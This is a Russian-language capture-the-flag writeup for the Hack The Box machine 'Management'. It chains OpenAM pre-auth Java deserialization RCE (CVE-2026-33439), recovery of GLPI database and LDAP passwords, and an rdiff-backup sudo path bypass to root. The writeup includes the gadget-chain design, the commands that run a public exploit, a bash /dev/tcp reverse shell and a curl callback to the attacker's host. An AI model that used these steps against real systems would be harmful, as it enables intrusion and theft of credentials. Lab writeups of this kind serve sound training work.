# Management — HackTheBox Writeup

**Платформа:** Hack The Box
**Категория:** Linux / Web Exploitation / Privilege Escalation
**Сложность:** Easy
**Цель:** 10.129.148.128
**Дата:** 2026-10-14

---

## Контекст / Область

Management — Linux-машина уровня Easy на Hack The Box. Цепочка атаки включает эксплуатацию неаутентифицированной уязвимости десериализации Java в OpenAM (**CVE-2026-33439**), использование открытых конфигурационных файлов GLPI для восстановления учётных данных и злоупотребление ошибкой в sudo-правиле `rdiff-backup` для получения root.

---

## Разведка

### Сканирование Nmap

```bash
nmap -Pn -sC -sV -p- --min-rate=1000 -oN nmap_management.txt 10.129.148.128
```

Ключевые находки:

| Порт | Сервис | Детали |
|------|--------|--------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | nginx, редирект на HTTPS |
| 443 | HTTPS | nginx 1.24.0, SSL-сертификат раскрывает `management.htb` и `*.management.htb` |
| 4444 | SSL/LDAP | Внутренний LDAP OpenAM |
| 50389 | LDAP | Анонимная привязка разрешена |

SSL-сертификат раскрывает имя хоста `sso.management.htb` — намёк на SSO-поддомен.

### Настройка хоста

```bash
echo "10.129.148.128 management.htb sso.management.htb" | sudo tee -a /etc/hosts
```

### Перечисление LDAP

```bash
ldapsearch -x -H ldap://10.129.148.128:50389 -s base -b "" namingContexts
```

Возвращает `dc=management,dc=htb` как naming context.

### Веб-перечисление

```bash
curl -sk https://sso.management.htb/openam/ccversion/Version
```

Возвращает информацию о версии OpenAM (**16.0.5** — уязвимая версия), подтверждая, что SSO-портал — это OpenAM.

---

## Эксплуатация

### CVE-2026-33439: Pre-Auth RCE в OpenAM

**CVE-2026-33439** — неаутентифицированная десериализация Java в OpenIdentityPlatform OpenAM (версии ≤ 16.0.5), приводящая к полному RCE.

**CVSS 4.0:** 9.3 Critical
**CVSS 3.1:** 9.8 Critical

#### Суть уязвимости

JATO сериализует состояние UI в HTTP-параметры `jato.pageSession` и `jato.clientSession`. После **CVE-2021-35464** для `jato.pageSession` был добавлен `WhitelistObjectInputStream` (белый список классов). Однако для `jato.clientSession` **фикс не применили** — код идёт через `ClientSession.deserializeAttributes()` → `Encoder.deserialize()` → `ApplicationObjectInputStream.readObject()` **без фильтрации классов**.

Ключевая цитата из advisory:
> *«The same river flows twice, they fixed jato.pageSession (CVE-2021-35464) and forgot jato.clientSession (CVE-2026-33439). A deserialization gadget chain does not ask for credentials.»*

#### Родословная с CVE-2021-35464

| | CVE-2021-35464 | CVE-2026-33439 |
|--|----------------|----------------|
| Параметр | `jato.pageSession` | `jato.clientSession` |
| Класс-приёмник | `ConsoleViewBeanBase.deserializePageAttributes()` | `ClientSession.deserializeAttributes()` |
| Защита | `WhitelistObjectInputStream` | **отсутствует** |
| Статус | исправлено | уязвимо |

Примитив атаки тот же — изменилось только имя параметра и путь к sink.

#### Attack Surface

Эксплуатируемы любые JATO ViewBean endpoints, чьи JSP содержат тег `<jato:form>`:

| Endpoint | Назначение |
|----------|-----------|
| `/ui/PWResetUserValidation` | Сброс пароля — ввод пользователя |
| `/ui/PWResetQuestion` | Сброс пароля — секретные вопросы |
| `/ui/Login` | Вход |

Endpoints сброса пароля — основная цель, так как они **публично доступны по дизайну** и гарантированно рендерят `<jato:form>`.

**Важно:** `jato.clientSession` **не появляется** в отрендеренном HTML — он внутри `<jato:content name="resetPage">`. Но `<jato:useViewBean>` в начале JSP **всегда** инстанцирует ViewBean и обрабатывает `jato.clientSession` до решения о рендере блоков. Десериализация срабатывает в момент инстанцирования.

#### Цепочка гаджетов (Gadget Chain)

Ключевая особенность: **цепочка использует только классы из самого WAR-файла OpenAM** — никаких внешних библиотек не требуется.

```
PriorityQueue.readObject()                          [JDK]
 → heapify() → siftDown() → comparator.compare()
   → Column$ColumnComparator.compare()              [openam-core-16.0.5.jar]
   → Column.getTable().isSortedAscending()          [click-nodeps-2.3.0.jar]
   → Column.getProperty(o1)
     → PropertyUtils.getObjectPropertyValue(o1, "outputProperties")
       → Method.invoke(o1, "getOutputProperties")
         → TemplatesImpl.getOutputProperties()      [xalan-2.7.3.jar]
           → getTransletInstance()
             → defineTransletClasses()
               → TransletClassLoader.defineClass(_bytecodes)
                 → _class[_transletIndex].newInstance()
                   → EvilTranslet.<clinit>()        [байткод атакующего]
                     → Runtime.getRuntime().exec(cmd)
```

**Критическая деталь:** `Column$ColumnComparator.compare()` сначала вызывает `column.getTable().isSortedAscending()`, и только потом `getProperty()`. Если `getTable()` вернёт `null` — цепочка оборвётся с `NullPointerException`. Поэтому в `Column` нужно предварительно установить `Table` через `column.setTable(table)`.

#### Ключевая деталь — `Encoder.decodeHttp64`

`Encoder` использует **URL-safe Base64** (Java `Base64.getUrlDecoder()`), а не стандартный Base64 и не кастомную замену символов.

Проверка через декомпиляцию:
```bash
jar xf /work/jato-shaded-16.0.5.jar com/iplanet/jato/util/Encoder.class
javap -p -c com/iplanet/jato/util/Encoder.class | grep -A10 "decodeHttp64"
```

Ожидаемый вывод:
```
public static byte[] decodeHttp64(java.lang.String);
Code:
   0: invokestatic  #8  // Method java/util/Base64.getUrlDecoder:()Ljava/util/Base64$Decoder;
   3: aload_0
   4: invokevirtual #9  // Method java/util/Base64$Decoder.decode:(Ljava/lang/String;)[B
   7: areturn
```

**Правильное кодирование:**
```java
Base64.getUrlEncoder().withoutPadding().encodeToString(serializedBytes)
```

⚠️ Любое другое кодирование (стандартный Base64, ручная замена) → `decodeHttp64()` бросит исключение или вернёт битые байты → десериализация молча прервётся **без ошибки в HTTP-ответе**.

---

### Подготовка эксплойта (TheMalwareGuardian)

Публичный эксплойт: [github.com/TheMalwareGuardian/CVE-2026-33439](https://github.com/TheMalwareGuardian/CVE-2026-33439)

#### Важное замечание

В репозитории **уже есть готовая папка `Jars/`** внутри `02 Exploit/` со всеми необходимыми библиотеками. Дополнительно скачивать WAR и распаковывать JAR-ы **не требуется** — можно сразу запускать эксплойт.

Если по какой-то причине JAR-ов нет, их можно извлечь из WAR:

```bash
wget https://github.com/OpenIdentityPlatform/OpenAM/releases/download/16.0.5/OpenAM-16.0.5.war
unzip OpenAM-16.0.5.war -d /tmp/openam_extracted
find /tmp/openam_extracted -name "*.jar" -exec cp {} "02 Exploit/Jars/" \;
# servlet-api.jar — из Tomcat или Maven
```

**Ожидаемый список JAR-ов в `Jars/`:**
```
openam-core-16.0.5.jar
xalan-2.7.3.jar
serializer-2.7.3.jar
click-nodeps-2.3.0.jar
click-extras-2.3.0.jar
jato-shaded-16.0.5.jar
servlet-api.jar (или javax.servlet-api-4.0.1.jar)
```

#### Запуск эксплойта

```bash
# --- Слушатель (в отдельном терминале) ---
nc -lvnp 4444

# --- Клонирование и запуск ---
cd ~ && git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git
cd CVE-2026-33439/"02 Exploit"

python3 Exploit_CVE_2026_33439.py \
  --url https://sso.management.htb/openam \
  --command "bash -i >& /dev/tcp/10.10.14.215/4444 0>&1" \
  --jars Jars/
```

**Опции скрипта:**
```bash
python3 Exploit_CVE_2026_33439.py --help
```
- `--url` — базовый URL OpenAM (обязательно)
- `--command` — команда для выполнения
- `--jars` — директория с JAR-файлами
- `--endpoint` — конкретный endpoint (по умолчанию автоподбор)
- `--method` — GET или POST
- `--proxy` — HTTP-прокси (для отладки через Burp)

**Как устроен Python-скрипт:**

1. **Компилирует `EvilTranslet.java`** — класс, расширяющий `AbstractTranslet`, с полезной нагрузкой в static-блоке (выполняется при `newInstance()`).
2. **Компилирует `PayloadBuilder.java`** — строит gadget chain:
   - `TemplatesImpl` с байткодом `EvilTranslet`
   - `Column` с привязанным `Table` (иначе NPE)
   - `PriorityQueue` с `size=2` (для запуска `heapify()` → `compare()`)
3. **Сериализует** `PriorityQueue` через `ObjectOutputStream`.
4. **Кодирует** в URL-safe Base64 без padding.
5. **Отправляет** GET/POST на `/ui/PWResetUserValidation` с параметром `jato.clientSession`.

**Проверка RCE через out-of-band callback:**

```bash
# Терминал 1
nc -lvnp 9999

# Терминал 2 — payload с curl
python3 Exploit_CVE_2026_33439.py \
  --url https://sso.management.htb/openam \
  --command "curl http://10.10.14.215:9999/pwned" \
  --jars Jars/
```

Если RCE работает — в терминале 1 увидите входящее HTTP-соединение.

**Стабилизация шелла:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Латеральное перемещение

### Обнаружение конфигурации GLPI

```bash
id
ls -la /home
ls -la /opt
cat /opt/glpi/config/config_db.php
```

Раскрывает учётные данные базы данных: `glpi:8rhu0L6Pw4Y7` для базы `glpidb`.

### Доступ к базе данных

```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT rootdn, rootdn_passwd FROM glpi_authldaps\G"
```

Возвращает зашифрованный пароль сервисной учётной записи LDAP:
```
avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

### Расшифровка пароля через GLPIKey

GLPI использует класс `GLPIKey` с общедоступным `glpicrypt.key` для шифрования/расшифровки чувствительных полей базы данных.

```bash
cd /opt/glpi
php -r 'define("GLPI_CONFIG_DIR","/opt/glpi/config"); require "vendor/autoload.php"; echo (new \GLPIKey())->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==")."\n";'
```

**Расшифрованный пароль:** `WpczC40GhTbk`

### SSH-доступ как owen

Повторное использование пароля подтверждено: пароль сервисной учётной записи LDAP подходит для локального пользователя `owen`.

```bash
ssh owen@management.htb
# Пароль: WpczC40GhTbk
```

**User Flag:**

```bash
cat ~/user.txt
# 4575a40cc178a28c281af42da910f782
```

---

## Повышение привилегий

### Перечисление sudo

```bash
sudo -l
```

Вывод:
```
(ALL) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

### Обход ограничения пути в rdiff-backup

Ограничение `--restrict-path /opt/backup` обходится через `--remote-schema`, который позволяет переопределить путь на `/root`.

```bash
rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" /root::/root /tmp/root_backup
```

Плейсхолдер `%s` подставляется как `/root`, позволяя операции чтения получить доступ к `/root` несмотря на intended-ограничение.

**Root Flag:**

```bash
cat /tmp/root_backup/root.txt
# 6de2624c80fadc1d406cb97b69ca9bf1
```

---

## Тупиковые пути

- Первоначальный nmap без `-Pn` может пропустить хост, если ICMP заблокирован.
- Учётные данные Tomcat по умолчанию на порту 8080 (если есть) — не тот путь.
- Доступ к веб-интерфейсу GLPI требует аутентификации, изначально недоступной.
- Скачивание WAR нужно только для извлечения JAR-библиотек — в репозитории TheMalwareGuardian они уже включены.

---

## Результат

**user.txt:** `4575a40cc178a28c281af42da910f782`
**root.txt:** `6de2624c80fadc1d406cb97b69ca9bf1`

Полная компрометация машины через:
1. Pre-auth RCE в OpenAM (**CVE-2026-33439**)
2. Открытые учётные данные GLPI и слабое хранение ключа шифрования
3. Повторное использование пароля между сервисной и локальной учётными записями
4. Ошибка в sudo, позволяющая обойти ограничение пути

---

## Использованные инструменты

- **nmap** — сканирование портов и перечисление сервисов
- **ldapsearch** — перечисление LDAP-каталога
- **CVE-2026-33439 exploit** (TheMalwareGuardian) — RCE в OpenAM
- **netcat** — слушатель для reverse shell
- **mysql** — доступ к базе данных
- **php** — расшифровка пароля GLPI
- **rdiff-backup** — повышение привилегий

---

## Уроки

1. **Неполные фиксы опаснее отсутствия фиксов.** Разработчики закрыли `jato.pageSession` (CVE-2021-35464), но забыли `jato.clientSession` (CVE-2026-33439) — тот же примитив десериализации, другой sink.
2. **Десериализация без whitelist'а** — критическая уязвимость, даже если параметр кажется «внутренним».
3. **Отсутствие внешних зависимостей** в gadget chain делает эксплойт универсальным для любого дефолтного деплоя OpenAM.
4. **Кодирование важно.** URL-safe Base64 vs стандартный — разница между работающим эксплойтом и молчаливым провалом.
5. **Ключи шифрования, хранящиеся рядом с зашифрованными данными**, не обеспечивают безопасности. Общедоступный `glpicrypt.key` в GLPI полностью обнуляет шифрование базы данных.
6. **Повторное использование пароля** между сервисными и локальными учётными записями — повторяющаяся слабость на HTB и в реальных средах.
7. **Sudo-ограничения должны проверяться на полной поверхности аргументов инструмента.** `--restrict-path` в `rdiff-backup` тривиально обходится через `--remote-schema`.

---

## Ссылки

- [CVE-2026-33439 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-33439)
- [GHSA-2cqq-rpvq-g5qj](https://github.com/advisories/GHSA-2cqq-rpvq-g5qj) — GitHub Security Advisory
- [TheMalwareGuardian/CVE-2026-33439](https://github.com/TheMalwareGuardian/CVE-2026-33439) — публичный эксплойт
- [CVE-2021-35464](https://nvd.nist.gov/vuln/detail/CVE-2021-35464) — предок-уязвимость
- [PortSwigger Research — Pre-Auth RCE in ForgeRock OpenAM](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam)
- [CWE-502](https://cwe.mitre.org/data/definitions/502.html) — Deserialization of Untrusted Data

---

## Очистка / Заметки по безопасности

```bash
rm -rf /tmp/root_backup
rm -rf /tmp/openam_extracted
```

Учётные данные и флаги задокументированы только для целей writeup.
